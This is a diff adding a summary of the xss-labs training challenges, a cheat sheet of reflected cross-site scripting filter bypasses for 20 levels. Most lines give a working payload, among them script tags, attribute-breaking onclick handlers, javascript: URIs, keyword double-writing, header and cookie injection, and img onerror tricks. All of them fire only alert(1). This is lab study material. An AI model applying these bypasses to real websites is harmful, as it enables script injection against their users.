@@ -1,0 +1,23 @@
+vulnerability name: Reflected XSS — filter bypass (xss-labs)
+URL: https://github.com/do0dl3/xss-labs
+parameter(s): keyword, t_sort, Referer, User-Agent, Cookie(user), src, arg01/arg02
+challenge(if have):
+  20 levels of increasingly strict input filters. Bypass per level:
+  L1  no filter                 -> <script>alert(1)</script>
+  L2  htmlspecialchars on <h2>  -> "><script>alert(1)</script>//
+  L3  htmlspecialchars(value), no ENT_QUOTES -> ' onclick='alert(1)
+  L4  strip < >                 -> " onclick="alert(1)"
+  L5  replace on/<script        -> "><a href='javascript:alert(1)'>
+  L6  case-sensitive replace    -> "><a Href='javascript:alert(1)'>
+  L7  strip keywords (once)     -> double-write "><scrscriptipt>alert(1)</scrscriptipt>//
+  L8  strip keywords + "->&quot -> HTML-entity encode javascript:alert(1)
+  L9  require http://           -> javascript:alert(1)//http://
+  L10 hidden t_sort, strip <>   -> t_sort=" type="text" onclick="alert(1)
+  L11 Referer reflection        -> Referer: " type="text" onclick="alert(1)
+  L12 User-Agent reflection     -> User-Agent header injection
+  L13 Cookie reflection         -> user=" type="text" onclick="alert(1)
+  L14 exif XSS                  -> (iframe unreachable, external ref)
+  L15 ng-include                -> src='level1.php?name=<img src=x onerror=alert(1)>'
+  L16 replace script/space//    -> <img%0asrc=x%0aonerror='alert(1)'>
+  L17/18 embed src              -> arg02= onmouseover=alert(1) (IE only)
+  L19/20 external refs          -> (CSDN write-ups, no inline content)
